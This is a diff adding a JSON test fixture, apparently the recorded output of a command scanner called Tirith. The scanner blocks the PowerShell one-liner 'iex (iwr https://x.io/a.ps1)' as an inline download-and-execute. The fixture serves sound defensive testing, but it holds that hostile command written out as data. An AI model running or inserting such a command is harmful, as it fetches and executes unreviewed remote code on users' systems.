@@ -1,0 +1,67 @@
+{
+  "shell": "powershell",
+  "command": "iex (iwr https://x.io/a.ps1)",
+  "exitCode": 1,
+  "output": {
+    "action": "block",
+    "bypass_honored": false,
+    "bypass_requested": false,
+    "findings": [
+      {
+        "description": "The shell will execute a grouped, encoded, or dynamically selected value, but Tirith cannot prove the complete executable body. The command is blocked instead of trusting its benign-looking outer leader.",
+        "evidence": [
+          {
+            "matched": "iex (iwr https://x.io/a.ps1)",
+            "pattern": "dynamic shell wrapper body",
+            "type": "command_pattern"
+          }
+        ],
+        "remediation": "Review the named file. Shrink or split an oversized config so it fits the analysis ceiling, fix permissions on an unreadable file, or inspect an unsupported artifact out of band until artifact analysis ships. To accept a known-benign gap, exclude the file or set the coverage action to ignore in an operator policy. To enforce completeness in CI, set scan.require_complete or raise the per-class action to fail.",
+        "rule_id": "analysis_incomplete",
+        "severity": "HIGH",
+        "title": "Nested executable body could not be resolved"
+      },
+      {
+        "description": "iex / Invoke-Expression is the leading command and one of its arguments contains a URL. The fetched content will be executed without inspection. Save the script with -OutFile and review it before running.",
+        "evidence": [
+          {
+            "matched": "iex (iwr https://x.io/a.ps1)",
+            "pattern": "iex (iwr <url>)",
+            "type": "command_pattern"
+          }
+        ],
+        "mitre_id": "T1059.001",
+        "remediation": "Download the script to disk, inspect it, then run it with explicit script-signing or content verification.",
+        "rule_id": "ps_inline_download_execute",
+        "severity": "HIGH",
+        "title": "PowerShell inline download-and-execute (iex with URL)"
+      },
+      {
+        "description": "A destructive command may be hidden beyond Tirith's bounded nested-shell depth, lexical-candidate, input, or retained-body budget.",
+        "evidence": [
+          {
+            "matched": "nested body suffix omitted by bounded analysis",
+            "pattern": "nested shell execution coverage gap",
+            "type": "command_pattern"
+          }
+        ],
+        "remediation": "Review the named file. Shrink or split an oversized config so it fits the analysis ceiling, fix permissions on an unreadable file, or inspect an unsupported artifact out of band until artifact analysis ships. To accept a known-benign gap, exclude the file or set the coverage action to ignore in an operator policy. To enforce completeness in CI, set scan.require_complete or raise the per-class action to fail.",
+        "rule_id": "analysis_incomplete",
+        "severity": "HIGH",
+        "title": "nested command analysis was incomplete"
+      }
+    ],
+    "interactive_detected": false,
+    "policy_path_used": null,
+    "schema_version": 3,
+    "tier_reached": 3,
+    "timings_ms": {
+      "tier0_ms": 0,
+      "tier1_ms": 0,
+      "tier2_ms": 0,
+      "tier3_ms": 0,
+      "total_ms": 0
+    },
+    "urls_extracted_count": 2
+  }
+}
